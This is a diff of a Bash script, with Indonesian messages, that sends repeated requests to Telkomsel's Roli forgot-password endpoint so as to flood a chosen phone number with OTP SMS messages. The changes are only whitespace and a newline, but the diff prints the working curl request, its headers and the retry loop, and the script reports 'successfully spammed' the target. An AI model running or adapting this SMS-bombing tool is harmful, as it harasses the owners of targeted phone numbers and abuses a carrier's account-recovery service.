@@ -4,16 +4,16 @@
 hitung=10
 if [[ -z $(command -v "curl") ]];then echo "belom dinstall!";fi 
 function heder(){
-              H="Upgrade-Insecure-Requests: 1"
-              D="msisdn=$x"
-              R="https://roli.telkomsel.com/auth/forgot_password"
+                 H="Upgrade-Insecure-Requests: 1"
+                 D="msisdn=$x"
+                 R="https://roli.telkomsel.com/auth/forgot_password"
 }
 function ceklist(){
-	       found="NOT FOUND!"
-         if [[ ! -f $vos ]]; then
-         	printf "%s\n" $found
-         	exit 1
-         fi
+	         found="NOT FOUND!"
+                 if [[ ! -f $vos ]]; then
+         	   printf "%s\n" $found
+         	   exit 1
+                 fi
 }
 ###############################################################################
 clear
@@ -63,9 +63,9 @@ function Roli_Tsel(){
              -H "Referer: https://roli.telkomsel.com/auth/forgot_password" \
              -H $H --compressed | grep -Po '(?<="message":)[^,]*')
              if [[ $c =~ "kode otp berhasil dikirimkan." ]]; then
-                printf "[+] mantav berhasil spam ke $x"
+                 printf "[+] mantav berhasil spam ke $x \n"
             else
-                Requ_Tsel
+                 Requ_Tsel
              fi
 }
 Roli_Tsel
